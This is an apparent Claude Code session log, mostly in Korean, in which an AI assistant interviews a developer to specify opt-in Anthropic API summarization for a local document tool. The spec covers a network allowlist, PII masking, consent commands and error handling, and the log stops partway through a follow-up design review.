 ▐▛███▛█   Claude Code v2.1.238
▝▜██████▀  Sonnet 5 · Claude Max
  ▝▝ ▝▝    ~\orca\CorpBrain-app-01

 ▎ Fable 5 is now a standard part of your Max plan
 ▎ You can use up to 50% of your weekly usage limit on Fable 5. If you hit your limit, you can continue on Fable 5 with usage credits. Fable 5 draws down usage faster than Opus 5. Run /model and select Fable to use it. Learn more: https://support.claude.com/en/articles/15424964-claude-fable-5-promotional-access

❯ /interview 0.5 버전 개발 시작하려고                                           
한다.C:/Users/docto/orca/CorpBrain-app-01/docs/ROADMAP.md 참조                  

  Read 1 file (ctrl+o to expand)

● 로드맵을 확인했다. v0.5 테마는 "클라우드 옵트인" — 외부 LLM 인증·연동 +
  NetworkGuard + PII 마스킹 + 동의 게이트다. 질문 전에 코드베이스를 먼저
  조사하겠다.

● 4 background agents launched (↓ to manage)
   ├ Explore: 단일 관문(gateway) 모듈 구조
   ├ Explore: 설정/CLI 구조와 모델 선택 방식
   ├ Explore: 기존 스펙 문서의 v0.5 관련 언급·비목표
   └ Explore: 요약 파이프라인·프롬프트·테스트 패턴

● 코드베이스 조사를 위해 4개의 병렬 탐색 에이전트를 띄웠다 (관문 함수 구조,
  CLI/설정 구조, 기존 스펙 문서, 요약 파이프라인). 결과가 오는 대로 취합해서
  질문을 시작하겠다.
  ⎿  Error: `prompt` is required when `stop` is not true.

● 4개의 백그라운드 탐색 에이전트가 조사를 진행 중이다. 완료되는 대로 자동으로
  알림을 받게 되므로 결과를 기다리겠다.

✻ Worked for 54s

● Agent "Explore: 단일 관문(gateway) 모듈 구조" finished · 49s

● 코드베이스 조사를 위해 띄운 백그라운드 에이전트 4개 중 나머지 결과를 기다리는
  중이다. 곧 결과가 모이면 인터뷰 질문을 시작하겠다.

● 나머지 3개의 탐색 에이전트(CLI/설정 구조, 기존 스펙 문서, 요약 파이프라인)
  결과를 기다리고 있다. 완료되는 대로 취합해서 v0.5 인터뷰를 시작하겠다.

● 탐색 에이전트 완료를 계속 기다리는 중이다.

✻ Brewed for 26s

● Agent "Explore: 설정/CLI 구조와 모델 선택 방식" finished · 1m 15s

● 탐색 에이전트 4개 중 2개 완료, 나머지 2개(기존 스펙 문서, 요약 파이프라인)
  대기 중이다.

✻ Worked for 7s

● Agent "Explore: 요약 파이프라인·프롬프트·테스트 패턴" finished · 1m 13s

● 마지막 탐색 에이전트(기존 스펙 문서 조사) 완료를 기다리는 중이다.

✻ Baked for 6s

● Agent "Explore: 기존 스펙 문서의 v0.5 관련 언급·비목표" finished · 1m 44s

● 4개 탐색 결과를 종합했다. 핵심 발견:

  - 관문(gateway.py)에 확장 지점이 이미 코드 주석으로 예약되어 있음 —
    NetworkGuard(호스트/스킴 allowlist)와 PII 마스킹 게이트가 들어갈 정확한
    위치가 표시돼 있지만 실제 코드는 없음.
  - Provider/backend 추상화가 전혀 없음 — summarize()/embed()는 Ollama 전용으로
    하드코딩. 클라우드 provider를 추가하려면 이 구조를 새로 설계해야 함.
  - 자격증명 저장 방식(설정 파일 등)이 전무 — v0.5가 처음 도입해야 하는 개념.
  - ROADMAP.md에 이미 [사용자 결정]으로 박혀 있는 상위 원칙: "로컬 우선 +
    클라우드 옵트인", 기본값은 외부 통신 0, 반드시 동의 → PII 마스킹 → 
    NetworkGuard allowlist를 거쳐 단일 게이트웨이로만.
  - 다만 "정규식 7종"(PII 패턴), "Option A"가 구체적으로 어떤 클라우드 
    provider인지, PRD v1.1 문서 자체는 실존하지 않음 — 참조만 있고 실체가 없는
    공백들.
  - v0.4까지 LLM 호출 지점이 요약/임베딩 2곳으로 늘었는데, 클라우드 옵트인이 이
    둘 다에 적용되는지는 어디에도 정해진 바 없음.

  이제 인터뷰를 시작하겠다. 먼저 이 슬라이스가 해결하려는 문제부터 확인하고
  싶다.
● User answered Claude's questions:
  ⎿  · v0.5(클라우드 옵트인)를 도입하려는 핵심 동기는 무엇인가? 어떤 사용 
     시나리오를 해결하려는 것인가? → 1,2,3 모두 해당

● 좋다, 세 시나리오(품질 향상/로컬 미가용 대안/대용량 문서) 모두 해당하는 것으로
  기록하겠다. 다음은 범위 — 이번 슬라이스에서 지원할 클라우드 provider를 정해야
  한다.

● User answered Claude's questions:
  ⎿  · 이번 슬라이스에서 얰니 클라우드 LLM provider를 지원할 것인가? (코드에 
     provider 추상화가 전혀 없어 이번에 새로 설계해야 함) → 단일 provider (추천)

● 단일 provider로 확정. 어떤 provider인지 구체적으로 정해야 한다.

● User answered Claude's questions:
  ⎿  · 단일 provider로 어느 것을 선택하는가? → Anthropic API

● User answered Claude's questions:
  ⎿  · 클라우드 옵트인이 적용되는 범위는? (현재 LLM 호출 지점은 
     요약/임베딩/모델탐지 3곳) → 요약만 (추천)

● User answered Claude's questions:
  ⎿  · 클라우드 엔진 선택은 어떤 단위로 이들어지는가? → 실행(run) 전체 수동 지정
     (추천)

● User answered Claude's questions:
  ⎿  · '동의 게이트'는 구체적으로 어떻게 동작해야 하는가? → 최초 1회 명시적 동의
     + 저장 (추천)

● User answered Claude's questions:
  ⎿  · 동의 상태와 API 키는 어디에 저장하는가? (기존 코드에 설정 파일/자격증명 
     저장 선례가 전혀 없음 — 이번에 새로 설계) → API키=환경변수 / 동의=로컬 
     설정파일 (추천)
  ⎿  Invalid tool parameters

● User answered Claude's questions:
  ⎿  · API 키 환경변수 이름은? (기존 코드는 
     CORPBRAIN_MODEL/CORPBRAIN_EMBED_MODEL처럼 항상 CORPBRAIN_ 접두사를 씀) → 
     ANTHROPIC_API_KEY (Anthropic 공식 관례)

● 다음은 이번 슬라이스의 가장 민감한 부분 — PII 마스킹 정책이다. 기존 스펙에
  "정규식 7종"이라는 표현만 있고 실체가 정의된 적이 없다.

● User answered Claude's questions:
  ⎿  · PII 마스킹이 탐지해야 할 패턴은 구체적으로 무엇인가? (이번 슬라이스에서 
     정규식 기반으로 새로 정의) → 한국 특화 7종 (추천)

● User answered Claude's questions:
  ⎿  · PII가 탐지되면 클라우드로 보낼 때 어떻게 처리하는가? → 자동 마스킹 후 
     전송 (추천)

● User answered Claude's questions:
  ⎿  · NetworkGuard allowlist와 클라우드 엔드포인트는 어떻게 구성하는가? → 
     하드코딩 단일 호스트 (추천)

● 다음은 CLI 인터페이스 — 사용자가 실제로 어떻게 클라우드 엔진을 켜는지 정한다.

● User answered Claude's questions:
  ⎿  · CLI에서 클라우드 엔진을 켜는 플래그는 어떻게 설계하는가? → --engine 
     {local|cloud} (추천)

● User answered Claude's questions:
  ⎿  · 클라우드 모델 선택은 어떻게 하는가? → --cloud-model 플래그 + 기본값 
     (추천)

● User answered Claude's questions:
  ⎿  · --cloud-model 기본값은 어느 모델로 하는가? → claude-haiku-4-5-20251001

● User answered Claude's questions:
  ⎿  · 최초 1회 동의는 어떻게 발급하는가? (배치성 CLI라 대화형 프롬프트가 어려운
     환경도 고려) → 전용 명령 `corpbrain consent cloud --grant` (추천)

● User answered Claude's questions:
  ⎿  · 동의 철회(`consent cloud --revoke`)와 `doctor` 명령의 cloud 상태 표시는 
     이번 슬라이스에 포함하는가? → 둘 다 포함 (추천)

● 다음은 실패 시나리오 — 클라우드 경로의 인증/네트워크 오류를 기존 exit-code
  체계(선행조건 실패 vs 개별 파일 스킵)에 어떻게 맞출지 정한다.
● User answered Claude's questions:
  ⎿  · ANTHROPIC_API_KEY 미설정 또는 API 인증실패(401)는 어떻게 처리하는가? → 
     선행조건 실패로 즉시 중단 (추천)

● User answered Claude's questions:
  ⎿  · 개별 파일 처리 중 레이트리미트(429) 또는 일시적 API 오류(5xx/타임아웃)는 
     어떻게 처리하는가? → 재시도 없이 해당 파일 스킵 (추천)

● User answered Claude's questions:
  ⎿  · cloud로 생성된 위키 마크다운의 front-matter는 
     기존(source_path/generated_at/model/source_bytes) 에 무엇을 추가하는가? → 
     engine 필드 추가 (추천)

● User answered Claude's questions:
  ⎿  · 동일 폴더를 local로 스캔한 뒤, 같은 원문 변경 없이 cloud로 다시 스캔하면 
     어떻게 되어야 하는가? (기존 재실행 규칙은 mtime만 보음) → engine이 다르면 
     강제 재생성 (추천)

● 모두 정리됐다. 이제 비목표를 명시적으로 확정하겠다 — 지금까지 나온 결정들에서
  자연스럽게 배제된 항목들이다.
  ⎿  Invalid tool parameters

● User answered Claude's questions:
  ⎿  · 비목표 확정 (1/2) — 해당 항목을 모두 고르라 → 복수 provider/임의 
     엔드포인트, ML 기반 PII 탐지, 자동 재시도/백오프

● User answered Claude's questions:
  ⎿  · 비목표 확정 (2/2) — 해당 항목을 모두 고르라 → 파일별 자동 라우팅/폴백, 
     API키 OS 키링/암호화 저장, RAG 답변 합성(cloud 활용), 임베딩/벡터검색의 
     클라우드 경로

● 인터페이스 계약 중 하나만 더 정하면 대부분 마무리된다 — 클라우드 쪽 JSON
  응답을 어떻게 강제할지.

● User answered Claude's questions:
  ⎿  · Anthropic API에서 title/one_line_summary/key_points/summary/tags 5필드 
     JSON을 어떻게 강제하는가? → Tool use(function calling) 강제 (추천)

● User answered Claude's questions:
  ⎿  · 코드 구조상 cloud 경로를 어떻게 넘어 붙이는가? (현재 provider 추상화 
     없음, 단일 provider로 확정된 상태) → 공통 인터페이스 먼저 설계

● User answered Claude's questions:
  ⎿  · 이 슬라이스는 API키·PII를 다루므로 보안 민감도가 높다. 기존 품질 
     게이트(TDD→spec-check→수동스모크→PR)에 보안 단계를 추가하는가? → PR 전 
     /security-review 필수 (추천)

● 중요한 구조적 제약이 하나 남아있다 — 기존 관문 함수는 urllib.request만 쓰는
  순수 stdlib 구현이고, 이 모듈 외에는 네트워크 라이브러리를 import하면 안
  된다는 정적 테스트가 이미 있다. Anthropic 공식 SDK를 쓰면 이 불변식이 깨진다.

● User answered Claude's questions:
  ⎿  · Anthropic API 호출을 어떻게 구현하는가? (기존 단일관문 불변식: gateway.py
     외에서 네트워크 라이브러리 import 금지) → 1,2번에 대해 더 자세하게 
     설명해줘.구현시 어떻게 다른 함수를 쓰는지  예시를 들어가면서. 기존 AST 
     검사가 뭐였지? (NetworkGuard가 SDK 내부 요청을 가로채지 못함)에 대해서도 
     설명

● 좋다, 두 옵션을 코드 예시와 함께 설명하겠다.

  기존 관문(gateway.py) 구조 (탐색 결과 기준):
  # corpbrain/core/gateway.py
  def request_json(url, *, method="GET", payload=None, timeout=60.0):
      # urllib.request.Request(url, data=json.dumps(payload)..., headers=...)
      # urllib.request.urlopen(req, timeout=timeout)
      # 응답을 JSON으로 파싱해 반환
      ...
  ollama_client.py/summarize.py/embed.py는 이 함수 하나만 호출한다.
  urllib.request를 직접 쓰는 곳은 gateway.py 단 한 파일뿐이다.

  옵션 1 — gateway 확장 (raw HTTP)
  # gateway.py에 headers 파라미터 추가
  def request_json(url, *, method="GET", payload=None, headers=None,
  timeout=60.0):
      ...

  # corpbrain/core/llm/anthropic_client.py (신규, ollama_client.py와 같은 패턴)
  def summarize_cloud(text, model, api_key, *, timeout=60.0):
      body = {"model": model, "messages": [...], "tools": [SUMMARY_TOOL_SCHEMA],
              "tool_choice": {"type": "tool", "name": "emit_summary"}}
      return gateway.request_json(
          "https://api.anthropic.com/v1/messages",
          method="POST", payload=body,
          headers={"x-api-key": api_key, "anthropic-version": "2023-06-01"},
          timeout=timeout,
      )
  urllib.request는 여전히 gateway.py 안에만 있다. 그래서 AST 
  검사(tests/test_gateway.py:267-283)가 그대로 통과한다 — 이 테스트는 패키지
  전체를 파싱해 gateway.py를 제외한 어떤 파일도
  socket/http/urllib.request/requests/httpx를 직접 import하지 않는지 정적으로
  검증한다. anthropic_client.py는 gateway만 import하므로 위반이 없다. 실제 소켓
  연결 목적지(api.anthropic.com)도 여전히 gateway.py 내부 한 곳에서만 열리므로,
  NetworkGuard(호스트 allowlist)와 PII 마스킹 게이트를 gateway.py의 예약된 지점
  한 곳에 넣으면 요약이 로컬이든 클라우드든 자동으로 다 통과한다.

  옵션 2 — 공식 anthropic SDK 도입
  import anthropic  # 패키지 내부에서 httpx로 자체 소켓 연결
  client = anthropic.Anthropic(api_key=api_key)
  response = client.messages.create(model=model, messages=[...], tools=[...])
  anthropic SDK는 내부적으로 httpx로 자체 HTTP 커넥션을 연다 —
  gateway.request_json()을 전혀 거치지 않는다. 이러면:
  - gateway.py에 NetworkGuard/PII 마스킹을 아무리 잘 넣어도 이 경로는 통과하지 
    않는다 — SDK 호출 지점에 별도로 같은 로직을 복제해야 하고, 이는 CLAUDE.md가
    명시한 "모든 외부 네트워크 호출은 단일 관문 함수를 통과"(필수 제약)를
    위반한다.
  - AST 검사도 anthropic_client.py가 import anthropic을 하는 순간 걸리거나(직접
    차단 목록에 추가돼 있다면), 아니면 검사를 무력화하는 예외 처리를 추가해야
    해서 "관문 우회 회귀 방지" 취지가 훼손된다.

  결론: 옵션 1이 필수다. 이건 사용자 취향 문제가 아니라 CLAUDE.md에 이미 박혀
  있는 하드 제약("두 구조 이음새를 유지한다 ... 모든 외부 네트워크 호출은 단일
  관문 함수를 통과")과 직접 충돌하기 때문이다. SDK의 재시도/스트리밍 등 편의
  기능은 이번 슬라이스 비목표(자동 재시도 없음, 스트리밍 불필요)와도 맞지 않아
  손해가 크지 않다.

● User answered Claude's questions:
  ⎿  · 설명을 확인했다. gateway.request_json() 확장(raw HTTP, 옵션 1)으로 
     진행해도 되는가? → 예, gateway.request_json() 확장으로 (추천)

● 한 가지 더 확인이 필요하다 — v0.3에서 도입된 GPU/토큰 게이팅이 --engine 
  cloud일 때도 그대로 적용되는지다. GPU 게이트는 로컬 모델 자원 보호 목적이라
  클라우드 경로와는 성격이 다르다.

● User answered Claude's questions:
  ⎿  · --engine cloud일 때 v0.3의 GPU 게이트(로컬 자원 보호 목적)는 어떻게 
     되는가? → GPU 게이트 자동 생략 (추천)

● 조사와 문답이 충분히 쌓였다. 지금까지 확정된 결정을 전체 목록으로 정리한다.

  ---

  v0.5 — 클라우드 옵트인(Anthropic API 요약) 결정 목록

  1. 목표 [사용자 결정]

  로컬 Ollama 요약의 한계(품질/가용성/컨텍스트 길이) 상황에서, 사용자가
  명시적으로 켤 때만 Anthropic API로 문서 요약을 처리할 수 있게 한다. 세
  시나리오 모두 해당: 품질 향상, 로컬 미가용 시 대안, 대용량 문서 처리.

  2. 비목표 [사용자 결정]

  - 복수 provider 지원 / 임의 OpenAI-호환 엔드포인트 (단일 provider:
    Anthropic만)
  - 임베딩·벡터검색의 클라우드 경로 (임베딩은 계속 로컬 nomic-embed-text 전용)
  - ML 기반 PII 탐지 (정규식 한국 특화 7종만)
  - 자동 재시도/백오프 (레이트리밋·일시오류는 재시도 없이 스킵)
  - 파일별 자동 라우팅/폴백 (엔진 선택은 run 전체 수동 지정만)
  - API 키 OS 키링/암호화 디스크 저장 (환경변수만, 디스크 미저장)
  - RAG 답변 합성(cloud 활용) — v0.4에서 이월된 별도 후속 슬라이스

  3. 인터페이스 계약 [사용자 결정 / 제안 후 승인]

  CLI
  corpbrain scan <folder> --engine {local|cloud}   # 기본 local
    --cloud-model NAME   기본 claude-haiku-4-5-20251001
  corpbrain consent cloud --grant     # 최초 1회 명시 동의, 로컬 설정파일에 기록
  corpbrain consent cloud --revoke    # 동의 철회
  corpbrain doctor                    # (플래그 무관) cloud 동의
  여부·ANTHROPIC_API_KEY 존재 여부도 함께 보고
  - API 키: ANTHROPIC_API_KEY 환경변수(Anthropic 공식 관례 이름 그대로 재사용).
    디스크 저장 없음.
  - 동의 상태: 로컬 설정 파일(경로는 구현 시 확정 — 예:
    ~/.corpbrain/config.json)에 저장. [제안 후 승인]

  호출 구현 [사용자 결정]
  - Anthropic 공식 SDK 미사용. 기존 gateway.request_json()에 headers 파라미터를
    추가해 raw HTTP로 Anthropic Messages API 직접 호출. 단일 관문 불변식(모든
    외부 호출은 gateway.py 하나만 경유) 그대로 유지.
  - corpbrain/core/llm/anthropic_client.py(신규)가 ollama_client.py와 같은
    패턴으로 이 호출을 감쌈.
  - JSON 5필드(title/one_line_summary/key_points/summary/tags) 강제는 Anthropic
    tool use(function calling)로 스키마 강제.
  - 코드 구조: 공통 Summarizer 인터페이스를 먼저 설계하고
    OllamaSummarizer/AnthropicSummarizer 두 구현체를 둠. pipeline.py가
    config.engine으로 dispatch. [제안 후 승인]

  NetworkGuard [사용자 결정]
  - allowlist는 하드코딩 단일 호스트(api.anthropic.com), CLI로 override 불가.
    HTTPS 강제, 리다이렉트 추적 차단.

  PII 마스킹 [사용자 결정]
  - 탐지 패턴 7종: 주민등록번호, 전화번호, 이메일, 사업자등록번호, 카드번호,
    계좌번호, IP주소 (정규식 기반).
  - 탐지되면 자동 마스킹(플레이스홀더 치환) 후 전송. 마스킹 개수는 로그/요약에
    표시.

  출력 마크다운 [사용자 결정]
  - front-matter에 engine: "cloud"|"local" 필드 추가. model 필드는 실제 사용
    모델명(claude-haiku-4-5-20251001 등).
  - 재실행 규칙: 기존 위키의 engine이 이번 실행의 --engine과 다르면 mtime 무관
    강제 재생성.

  4. 엣지 케이스·실패 시나리오 [사용자 결정]

  - ANTHROPIC_API_KEY 미설정 또는 API 인증실패(401): 선행조건 실패로 즉시
    중단(exit≠0), 파일 미처리.
  - --engine cloud + 동의 미기록: 선행조건 실패, consent cloud --grant 안내 후
    중단.
  - 레이트리밋(429)/일시오류(5xx·timeout): 재시도 없이 해당 파일만 스킵(사유
    포함), 나머지 계속 처리, exit 0(부분 성공).
  - --engine cloud일 때 v0.3 GPU 게이트는 자동 생략(로컬 자원과 무관하므로).
    --max-total-tokens 게이트는 engine과 무관하게 동일 적용(비용 보호 목적으로
    유지).

  5. 품질 게이트 추가 [사용자 결정]

  기존 로드맵 게이트(TDD→spec-check→수동스모크→PR)에 더해, PR 생성 전
  /security-review 필수(API 키 유출·PII 마스킹 우회·allowlist 우회 검토).

  6. 완료의 정의 (기계 판정 가능) [제안 후 승인]

  1. consent cloud --grant → 설정파일에 동의 기록 → 이후 scan --engine cloud
     동의 확인 통과.
  2. 동의 없이 scan --engine cloud → exit≠0, 산출물 0개, 안내 메시지에 grant
     명령 언급.
  3. consent cloud --revoke 후 다시 2번과 동일하게 실패.
  4. API 키 미설정/401 → exit≠0, 산출물 0개.
  5. cloud로 생성된 .md의 front-matter에 engine/올바른 model 값 존재.
  6. PII 7종을 심은 픽스처로 cloud 처리 시, gateway가 실제로 내보내는 payload에
     원본 PII 원문이 한 글자도 없고 마스킹 치환만 존재(gateway 스텁 캡처로
     검증).
  7. --engine cloud 실행 중 소켓 연결 목적지는 api.anthropic.com(HTTPS)뿐.
     --engine local(기본)은 기존과 동일하게 --ollama-url 외 연결
     없음(SocketWatcher 확장 검증).
  8. 429/5xx/timeout 파일은 재시도 없이 스킵 리포트에 사유 포함, 나머지 계속
     처리, exit 0.
  9. 같은 폴더를 local→cloud(또는 반대) 재스캔 시 mtime 무관 강제 재생성.
  10. corpbrain doctor가 cloud 동의·API키 존재 여부를 함께 보고.
  11. --engine cloud에서 GPU 게이트 미검출 환경에도 차단되지 않음.
      --max-total-tokens는 engine 무관 동일 적용.
  12. 신규 anthropic_client.py가 gateway.request_json()만 경유 — 기존 AST 기반
      단일관문 정적 테스트가 수정 없이 통과.
  13. /security-review에서 API 키 유출/PII 마스킹 우회/allowlist 우회 관련 높은
      심각도 미해결 발견사항 없음.

  ---

● User answered Claude's questions:
  ⎿  · 위 결정 목록이 맞는가? 이대로 스펙으로 저장해도 되는가? → 맞다, /spec으로
     저장 (추천)

● 확인됐다. /spec 스킬로 이 결정 목록을 스펙 문서로 저장하겠다.

● Skill(spec)
  ⎿  Successfully loaded skill · 5 tools allowed

  Searched for 1 pattern, read 2 files (ctrl+o to expand)

● Write(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Wrote 215 lines to
     static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md
       1 # 스펙: CorpBrain v0.5 — 클라우드 옵트인 (Anthropic API 요약 연
       2 
       3 - 상태: 확정
       5 
       6 ## 1. 목표
         용자가 명시적으로 켤 때만
       8 동작하는 클라우드 요약 경로를 추가한다. 로컬 Ollama 모델의 품질 
       9 없음·Ollama 미설치 등), 대용량 문서의 컨텍스트 한계 세 상황 모두
         에서 사용자가 대안으로 쓸 수
         ummarize) 호출에만 적용되며,
     … +316 lines (ctrl+o to expand)

● 스펙 초안을 작성해 static/docs/specs/features/corpbrain-v0.5-cloud-opt-in.md에
  저장했다. 전문은 다음과 같다.
  Read 1 file (ctrl+o to expand)

● User answered Claude's questions:
  ⎿  · 위 스페 전문을 확인했다. 이대로 확정해도 되는가? → 맞다, 확정 (추천)

● 스펙이 확정됐다.

  저장 경로: static/docs/specs/features/corpbrain-v0.5-cloud-opt-in.md

  인터뷰에서 확정된 핵심 사항: Anthropic API 단일 provider, --engine 
  {local|cloud} 플래그, corpbrain consent cloud --grant/--revoke 전용 동의 명령,
  ANTHROPIC_API_KEY 환경변수, 한국 특화 PII 7종 자동 마스킹, api.anthropic.com
  하드코딩 NetworkGuard allowlist, SDK 미사용(gateway 확장으로 단일 관문 유지),
  PR 전 /security-review 필수.

  다음 단계: CLAUDE.md의 스펙 주도 워크플로우에 따라 feat/* 브랜치에서 TDD로
  구현하고, 끝나면 /spec-check 
  static/docs/specs/features/corpbrain-v0.5-cloud-opt-in.md로 대조 검증할 수
  있다.

✻ Cooked for 1h 47m 36s

✻ Claude resuming /loop wakeup (Aug 21 1:33pm)

  Ran 1 shell command (ctrl+o to expand)

● 조용하다 — /interview→/spec이 스펙 확정으로 자연스럽게 마무리됐고, 구현은
  사용자가 별도 feat/* 브랜치를 열어 시작해야 하는 다음 단계라 자율적으로
  착수하지 않았다. 새 스펙 파일(corpbrain-v0.5-cloud-opt-in.md)은 아직 커밋되지
  않은 상태로 main에 남아있다 — 커밋도 명시적 요청 없이는 하지 않는다.

● Nothing actionable right now — the interview concluded with the v0.5 spec
  confirmed and saved, and starting implementation is a new phase that needs
  your explicit go-ahead. Next check-in in 30 minutes.

✻ Crunched for 49s

❯ /grill-it                                                                     

● /grill-it는 참조 범위(A)와 관심 방향(B)이 정해져야 시작할 수 있다. 아직 둘 다
  지정되지 않았다.

● User answered Claude's questions:
  ⎿  · 참조 범위(A) — 어떤 문서/디렉토리를 근거로 굽을까? → 방금 확정한 v0.5 
     스페 (추천)
     · 핵심 관심 방향(B) — 무엇의 모호함을 굽고 싶은가? → 구현 착수 전 남은 
     세부설계 (추천)

  Searched for 1 pattern, read 2 files (ctrl+o to expand)

● Write(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Wrote 17 lines to docs\grill\GRILL_LEDGER-v0.5.md
       1 # Grill Ledger — v0.5 클라우드 옵트인 (Anthropic API 요약 연동)
       3 참조 범위: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-
         in.md`
       4 관심 방향: v0.5 스펙의 구현 착수 전 남은 모호함 — 코드 레벨 인터
       5 완료조건: 아래 토픽 전부 RESOLVED
       6 OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in.
       7 
       8 RESOLVED: 0 / TOTAL: 8
       9 
         이렉트 판정) | depends:-  | status:UNRESOLVED
     … +18 lines (ctrl+o to expand)

● [범위 확인] 참조: static/docs/specs/features/corpbrain-v0.5-cloud-opt-in.md /
  방향: 구현 착수 전 남은 세부설계 / 완료조건: 아래 토픽 전부 RESOLVED / OUTPUT:
  v0.5 스펙 + 필요 시 CLAUDE.md

  ---

  [토픽 원장 — 총 8개 (CORE 5 / MINOR 3)]

  RESOLVED: 0 / TOTAL: 8
  - [ ] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다이렉트 판정) |
  depends:-  | status:UNRESOLVED
  - [ ] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처리 전 키 검증) |
  depends:T1 | status:UNRESOLVED
  - [ ] T3 | MINOR | cloud 호출 timeout 기본값 | depends:T2 | status:UNRESOLVED
  - [ ] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | depends:T2 |
  status:UNRESOLVED
  - [ ] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | depends:-  |
  status:UNRESOLVED
  - [ ] T6 | CORE  | Anthropic 요청 프롬프트·tool 스키마 상세 | depends:T5 |
  status:UNRESOLVED
  - [ ] T7 | MINOR | 동의 설정파일 쓰기 방식(원자적 쓰기 여부) | depends:-  |
  status:UNRESOLVED
  - [ ] T8 | MINOR | doctor/consent 명령 출력 문구 포맷 | depends:-  |
  status:UNRESOLVED

  ---

  [진척] RESOLVED 0 / TOTAL 8 · 현재 토픽: T1 NetworkGuard 호스트 매칭 로직

  스펙 §4.4는 "목적지 호스트를 검사한다"고만 적혀있고, URL에서 호스트를 어떻게
  추출·비교하는지, 3xx 리다이렉트를 구체적으로 어떻게 차단하는지는 비어 있다.

  [선택지]
  - A) urllib.parse.urlsplit로 (scheme, hostname) 추출 → 대소문자 무시 정확 일치
    비교, 커스텀 HTTPRedirectHandler로 3xx는 무조건 예외 처리 — 표준
    라이브러리만으로 충분, 추가 의존성 없음
  - B) 소켓 연결 직전 DNS 확인 결과까지 검사(DNS rebinding 방지) — 더 엄격하지만
    이번 슬라이스(단일 하드코딩 호스트, HTTPS 강제) 스코프에는 과함
  - C) 서픽스 매칭(*.anthropic.com 등 와일드카드 허용) — §4.4의 "하드코딩 단일
    호스트" 결정과 배치되어 부적합

  [권장] A) — 표준 urllib만으로 스펙의 "하드코딩 단일 호스트 + HTTPS 강제 +
  리다이렉트 차단" 요구를 정확히 충족하고, 기존 gateway.py가 이미
  stdlib-only라는 제약과도 맞는다.

● User answered Claude's questions:
  ⎿  · T1. NetworkGuard가 목적지 호스트를 검사하는 정확한 방식을 어떻게 
     구현할까? → urlsplit + 정확일치 + 리다이렉트 차단 (추천)

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 6 lines
      157    경로는 `api.anthropic.com`만 허용한다. 불일치 시 소켓을 열지
            않고 즉시 실패시킨다.
      158  - `engine=cloud` 요청은 스킴이 반드시 `https`여야 한다. 리다이
           렉트는 추적하지 않는다(3xx
      159    응답을 받으면 그대로 실패로 처리한다).
      160 +- **구현 방식** [제안 후 승인]: `urllib.parse.urlsplit(url)`로
          + `(scheme, hostname)`을 추출해                                
      161 +  대소문자 무시 정확 일치로 allowlist와 비교한다(서픽스·와일드
          +카드 매칭 없음). 리다이렉트                                   
      162 +  추적 차단은 표준 `urllib.request.HTTPRedirectHandler`를 오버
          +라이드해 3xx 응답 시 무조건                                   
      163 +  예외를 발생시키는 커스텀 opener를 `gateway.py`에 둔다. DNS  
          +재확인(rebinding 방지) 등                                     
      164 +  소켓 레벨 검증은 하지 않는다 — 단일 하드코딩 호스트 + HTTPS 
          +강제로 충분하다고 판단한다.                                   
      165 +  추가 서드파티 의존성 없이 stdlib(`urllib`)만으로 구현한다.  
      166  
      167  ### 4.5 PII 마스킹 [사용자 결정]
      168  - 신규 모듈(예: `corpbrain/core/pii.py`)이 정규식 기반 탐지·마
           스킹을 담당한다.

● Update(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       5  완료조건: 아래 토픽 전부 RESOLVED
       6  OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
          .md`, 필요 시 `CLAUDE.md`
       7  
       8 -RESOLVED: 0 / TOTAL: 8                                         
       8 +RESOLVED: 1 / TOTAL: 8                                         
       9  
      10 -- [ ] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
         -이렉트 판정) | depends:-  | status:UNRESOLVED                  
      10 +- [x] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
         +이렉트 판정) | status:RESOLVED | decision:urlsplit(scheme,hostn
         +ame) 대소문자무시 정확일치 + 커스텀 HTTPRedirectHandler로 3xx  
         +무조건 예외, stdlib만 사용 | applied:corpbrain-v0.5-cloud-opt-i
         +n.md §4.4                                                      
      11  - [ ] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처
          리 전 키 검증) | depends:T1 | status:UNRESOLVED
      12  - [ ] T3 | MINOR | cloud 호출 timeout 기본값 | depends:T2 | sta
          tus:UNRESOLVED
      13  - [ ] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | dep
          ends:T2 | status:UNRESOLVED

● [반영 완료] T1 → decision: urlsplit로 (scheme, hostname) 추출해 대소문자 무시
  정확 일치 비교, 커스텀 HTTPRedirectHandler로 3xx 무조건 차단, stdlib만 사용
  - 설계문서: corpbrain-v0.5-cloud-opt-in.md §4.4 갱신
  - 원장: GRILL_LEDGER-v0.5.md (RESOLVED 1 / TOTAL 8)

  ---

  [진척] RESOLVED 1 / TOTAL 8 · 현재 토픽: T2 Cloud 인증 프리플라이트 메커니즘

  스펙 §3 항목4는 "API가 401을 반환하면 파일을 하나도 처리하지 않고 exit
  1"이라고 판정 기준만 적어놨지, 그 판정을 언제·어떤 호출로 하는지가 비어 있다.
  첫 파일의 실제 요약 호출이 실패했을 때 사후적으로 판단하는 건지, 파일 루프
  진입 전 별도 확인 호출을 두는 건지가 다르다.

  [선택지]
  - A) 파일 루프 진입 전 GET https://api.anthropic.com/v1/models로 별도
    프리플라이트 — 토큰 비용 없이 키 유효성+연결성을 한 번에 확인, 기존 Ollama의
    /api/tags 프리플라이트 패턴과 동일한 자리(스캔 전 검증)
  - B) 최소 messages 호출(max_tokens=1)로 키 검증 — 토큰 비용 발생, 불필요한
    과금
  - C) 별도 확인 없이 첫 파일의 실제 요약 호출 실패로 판단 — "0건 처리" 보장을
    위해 첫 호출 실패 시 특별 처리(이미 시도한 부분 되돌리기)가 필요해 로직이
    지저분해짐

